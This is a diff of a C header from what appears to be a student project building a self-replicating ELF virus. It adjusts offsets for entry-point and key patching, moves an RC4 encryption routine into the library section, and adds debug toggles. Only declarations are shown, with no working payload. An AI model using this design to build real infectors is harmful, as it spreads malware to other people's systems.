@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/27 20:18:12 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/31 19:52:24 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,17 +32,20 @@
 
 # define USER_ENTRY	2
 # define ROOT_ENTRY	4
-# define BUFF_SIZE	4096
-# define ENTRY_OFF	1912
-
-# define KEY_OFF	85
+# define PROG_ENTRY	3
 # define KEY_SIZE	16
 
-# define PROG_ENTRY	3
+# define BUFF_SIZE	0x1000
 # define PROG_INFO	512
 
+# define ENTRY_OFF	2154
+# define KEY_OFF	85
 
 # define __INLINE__	__attribute__((always_inline)) inline
+
+// debug
+# define DEBUG
+//# define ENCRYPT
 
 /* Structures */
 typedef struct __attribute__ ((__packed__)) linux_dirent64
@@ -104,13 +107,12 @@ typedef struct	s_data
 	Elf64_Addr	cpr_entry;
 
 	void		*rsp;
-	char		cpr_key[KEY_SIZE];
+	uint8_t		cpr_key[KEY_SIZE];
 	size_t		context;
 }				t_data;
 
 /* Core */
 void			start(void);
-void			cypher_beg(t_data *data);
 void			opening(t_data *data);
 void			war(t_data *data);
 void			locate(t_data *data, t_directory *dir);
@@ -124,7 +126,6 @@ void			end(void);
 /*
 **	Misc
 */
-void			_rc4(const unsigned char *key, const size_t key_length, uint8_t *data, const size_t data_length);
 void			update_one(t_key *key, char *ptr, size_t size);
 void			update_two(t_key *key, char *ptr, size_t size);
 void			revert_one(t_key *key, char *ptr, size_t size);
@@ -134,6 +135,7 @@ bool			generate_key(uint8_t *key, size_t size);
 /*
 **	Lib
 */
+void			_rc4(const unsigned char *key, const size_t key_length, uint8_t *data, const size_t data_length);
 void			*_memcpy(void *d, void *s, size_t size);
 void			*_memset(void *b, int c, size_t len);
 int				_strncmp(char *s1, char *s2, size_t n);
